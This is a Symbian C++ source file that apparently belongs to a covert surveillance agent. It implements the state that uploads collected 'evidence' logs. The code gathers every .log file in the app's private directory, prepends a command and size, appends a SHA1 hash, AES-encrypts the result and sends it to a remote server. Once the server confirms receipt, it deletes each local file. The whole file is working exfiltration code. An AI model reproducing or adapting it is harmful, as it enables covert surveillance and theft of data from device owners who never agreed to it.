/*
 * StateEvidences.cpp
 *
 *  Created on: 16/feb/2011
 *      Author: Giovanna
 */

#include "StateEvidences.h"
#include "Keys.h"

#include <HT\AES.h>
#include <HT\FileUtils.h>
#include <HT\ShaUtils.h>
#include <HT\RESTUtils.h>

CStateEvidences::CStateEvidences(MStateObserver& aObserver) :
	CAbstractState(EState_Evidences, aObserver)
	{
	// No implementation required
	}

CStateEvidences::~CStateEvidences()
	{
	delete iRequestData;
	delete iResponseData;
	iFileList.ResetAndDestroy();
	iFileList.Close();
	iFs.Close();
	}

CStateEvidences* CStateEvidences::NewLC(MStateObserver& aObserver)
	{
	CStateEvidences* self = new (ELeave) CStateEvidences(aObserver);
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CStateEvidences* CStateEvidences::NewL(MStateObserver& aObserver)
	{
	CStateEvidences* self = CStateEvidences::NewLC(aObserver);
	CleanupStack::Pop(); // self;
	return self;
	}

void CStateEvidences::ConstructL()
	{
	iState = EInitState;
	User::LeaveIfError(iFs.Connect());
	}

void CStateEvidences::ActivateL(const TDesC8& aData)
	{
	iSignKey.Copy(aData);
	
	if (iState != EInitState)
		{
		// Log File has been sent. 
		// Delete the LogFile and remove it from the array
		HBufC* fileName = iFileList[0];
		iFs.Delete(*fileName);
		delete fileName;
		iFileList.Remove(0);
		}
	else
		{
		//this is the first run
		TFullName path;
		FileUtils::CompleteWithPrivatePathL(iFs, path);
		path.Append(_L("*.log"));
		FileUtils::ListFilesInDirectoryL(iFs, path, iFileList);
		
		iState = ESendLogData;
		}
	// Check if there exists log files...
	if (iFileList.Count() == 0)
		{
		iObserver.ChangeStateL();
		return;
		}
	//send evidence
	//here we are sure we don't need anymore the answer
	delete iResponseData;
	iResponseData = NULL;
	
	CBufBase* buffer = CBufFlat::NewL(10);
	CleanupStack::PushL(buffer);
	//append command
	buffer->InsertL(buffer->Size(),(TUint8 *)KProto_Log().Ptr(),KProto_Log().Size());
	//append size
	HBufC* fileName = iFileList[0];
	TUint32 fileSize = FileUtils::GetFileSize(iFs, *fileName);
	buffer->InsertL(buffer->Size(),&fileSize,sizeof(fileSize));
	HBufC8* plainBody = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	TInt plainBodySize = plainBody->Size();
	plainBody = plainBody->ReAllocL(plainBodySize+fileSize+20); //20=sha
	if(plainBody==NULL)
		{
		iObserver.ReConnect();
		return;
		}
	//append file
	//RBuf8 fileBuf(FileUtils::ReadFileContentsL(iFs, *fileName));
	//fileBuf.CleanupClosePushL();
	HBufC8* fileBuf = FileUtils::ReadFileContentsL(iFs,*fileName);
	if(fileBuf==NULL)
		{
		iObserver.ReConnect();
		return;
		}
	plainBody->Des().Append(*fileBuf);
	delete fileBuf;
	//CleanupStack::PopAndDestroy(&fileBuf);
	// calculate SHA1
	TBuf8<20> sha;
	ShaUtils::CreateSha(*plainBody,sha);
	//append SHA1
	plainBody->Des().Append(sha);
					
	// encrypt an send
	RBuf8 buff(AES::EncryptPkcs5L(*plainBody, KIV, iSignKey));
	if(buff.Size()<=0)
		{
		delete plainBody;
		iObserver.ReConnect();
		return;
		}
	buff.CleanupClosePushL();
	delete plainBody;
	//add REST header
	HBufC8* header = iObserver.GetRequestHeaderL();
	TBuf8<32> contentLengthLine;
	contentLengthLine.Append(KContentLength);
	contentLengthLine.AppendNum(buff.Size());
	contentLengthLine.Append(KNewLine);
	delete iRequestData;  
	iRequestData = NULL;
	TRAPD(error,(iRequestData = HBufC8::NewL(header->Size()+contentLengthLine.Size()+KNewLine().Size()+buff.Size())));
	if(error != KErrNone)
		{
		delete header;
		CleanupStack::PopAndDestroy(&buff);
		iObserver.ReConnect();
		return;
		}
	iRequestData->Des().Append(*header);
	delete header;
	iRequestData->Des().Append(contentLengthLine);
	iRequestData->Des().Append(KNewLine);
	iRequestData->Des().Append(buff);
	CleanupStack::PopAndDestroy(&buff);
	TRAPD(err,iObserver.SendStateDataL(*iRequestData));
	if(err != KErrNone)
		{
		iObserver.ReConnect();
		}
	}


void CStateEvidences::ProcessDataL(const TDesC8& aData)
	{
	//free resources
	delete iRequestData;
	iRequestData = NULL;
	
	//this is a response from server
	if(aData.Size()!=0)
		{
		if(iResponseData == NULL)
			{
			iResponseData = aData.AllocL();
			}
		else
			{
			TInt size = iResponseData->Size();
			iResponseData = iResponseData->ReAllocL(size+aData.Size()); //TODO:check this
			iResponseData->Des().Append(aData);
			}
		return;
		}
		
	if(iResponseData->Find(KApplicationOS)==KErrNotFound)
		{
		//server answered with a redirect
		iObserver.ResponseError(KErrContent);
		return;
		}
	//extract body from response
	RBuf8 body(CRestUtils::GetBodyL(*iResponseData));
	body.CleanupClosePushL();
	delete iResponseData;   
	iResponseData = NULL;
	//decrypt	
	RBuf8 plainBody(AES::DecryptPkcs5L(body,KIV,iSignKey));
	CleanupStack::PopAndDestroy(&body);
	plainBody.CleanupClosePushL();
	
	//check sha1
	if(!ShaUtils::ValidateSha(plainBody.Left(plainBody.Size()-20),plainBody.Right(20)))
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrSha);
		return;
		}
	//check response
	if(plainBody.Left(4).Compare(KProto_Ok) != 0)
		{
		CleanupStack::PopAndDestroy(&plainBody);
		iObserver.ResponseError(KErrNotOk);
		return;
		}
	CleanupStack::PopAndDestroy(&plainBody);
	
	iObserver.ReConnect();
		
	}

